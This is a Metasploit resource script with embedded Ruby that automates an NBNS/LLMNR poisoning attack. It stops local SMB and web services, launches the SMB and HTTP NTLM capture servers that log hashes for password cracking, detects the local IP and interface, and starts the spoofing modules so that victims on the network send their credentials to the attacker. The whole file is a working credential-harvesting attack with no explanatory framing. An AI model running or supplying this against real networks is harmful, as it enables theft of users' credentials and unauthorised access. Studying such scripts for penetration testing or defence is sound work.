<ruby>
system("service smbd stop")
</ruby>

use auxiliary/server/capture/smb
set JOHNPWFILE /root/t/smb
run

<ruby>
system("service apache2 stop")
</ruby>

use auxiliary/server/capture/http_ntlm
set JOHNPWFILE /root/t/http
set LOGFILE /root/t/http_log
set SRVPORT 80

<ruby>
require 'socket'

def local_ip
	orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true 
	UDPSocket.open do |s|
		s.connect '64.233.187.99', 1
		s.addr.last
	end
ensure
	Socket.do_not_reverse_lookup = orig
end
self.run_single("set SRVHOST #{local_ip()}")
</ruby>
set URIPATH /
run

use auxiliary/spoof/nbns/nbns_response
<ruby>
require 'socket'

def local_ip
	orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true 
	UDPSocket.open do |s|
		s.connect '64.233.187.99', 1
		s.addr.last
	end
ensure
	Socket.do_not_reverse_lookup = orig
end
ip = local_ip()
int = `ifconfig`
current = ""

int.each_line do |line|
	if line =~ /^[a-zA-Z]/
		current = /^([a-zA-Z0-9]*)\s*/.match(line)
	else
		if line =~ /#{ip}/
			self.run_single("set INTERFACE #{current}")
			break
		end
	end
end

self.run_single("set SPOOFIP #{ip}")
self.run_single("run")
sleep 3
self.run_single("use auxiliary/spoof/llmnr/llmnr_response")
self.run_single("set SPOOFIP #{ip}")
self.run_single("set INTERFACE #{current}")
</ruby>

run